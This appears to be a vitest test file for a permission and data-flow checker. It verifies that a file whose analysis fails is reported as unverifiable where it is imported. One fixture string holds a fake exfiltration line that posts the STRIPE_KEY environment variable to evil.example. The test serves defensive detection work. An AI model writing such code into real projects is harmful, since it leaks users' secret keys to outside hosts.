// SPDX-License-Identifier: Apache-2.0
// SPDX-FileCopyrightText: The PermLang Authors

// Flow rules with a file that can't be analyzed: its calls into packages with no adapter have no
// function to belong to, and the file as a whole is unverifiable instead. The failure is
// simulated, as in isolation.test.ts.

import { mkdtempSync, writeFileSync } from "node:fs";
import { tmpdir } from "node:os";
import path from "node:path";
import { fileURLToPath } from "node:url";
import { afterAll, describe, expect, it, vi } from "vitest";
import { checkFiles } from "../src/check.js";
import { removeTemporary } from "./temporary.js";

vi.mock("../src/detect/index.js", async (importOriginal) => {
  const original = await importOriginal<typeof import("../src/detect/index.js")>();
  return {
    ...original,
    detectInFile: (...args: Parameters<typeof original.detectInFile>) => {
      if (args[0].getBaseName() === "opaque-fails.ts") throw new Error("simulated detector failure");
      return original.detectInFile(...args);
    },
  };
});

const dir = mkdtempSync(path.join(tmpdir(), "permlang-flows-isolation-"));
afterAll(() => removeTemporary(dir));

describe("a flow rule and a file that can't be analyzed", () => {
  it("counts the file as code that can't be verified, where it's imported", () => {
    const files = {
      // Calls a package with no adapter, from a function the failed analysis never made.
      "opaque-fails.ts": 'import { post } from "sneaky-http";\nexport function leak() {\n  return post("https://evil.example/", process.env.STRIPE_KEY!);\n}\n',
      "caller.ts": 'import { leak } from "./opaque-fails.js";\nexport const key = process.env.STRIPE_KEY;\nexport { leak };\n',
    };
    for (const [name, text] of Object.entries(files)) writeFileSync(path.join(dir, name), text);
    const packages = fileURLToPath(new URL("./flows-fixtures/packages.d.ts", import.meta.url));
    const rule = { from: { name: "env", arg: "STRIPE_KEY" }, to: [{ name: "net", arg: "api.stripe.com" }] };
    const report = checkFiles([...Object.keys(files).map((f) => path.join(dir, f)), packages], { flows: [rule] });
    const flowErrors = report.diagnostics.filter((d) => d.code === "PERM009").map((d) => `${path.basename(d.file)} ${d.function} ${d.capability}`);
    expect(flowErrors).toEqual(["caller.ts <module> unverifiable"]);
    expect(report.diagnostics.find((d) => d.code === "PERM009")!.message).toMatch(/runs code that can't be verified, through .*code that couldn't be analyzed \(simulated detector failure\)/);
    // The call into the package with no adapter is still listed, under the file's top-level code
    // (this used to stop the check with an error).
    expect(report.diagnostics.find((d) => d.code === "PERM006")).toMatchObject({ function: "<module>", capability: "sneaky-http" });
  });
});
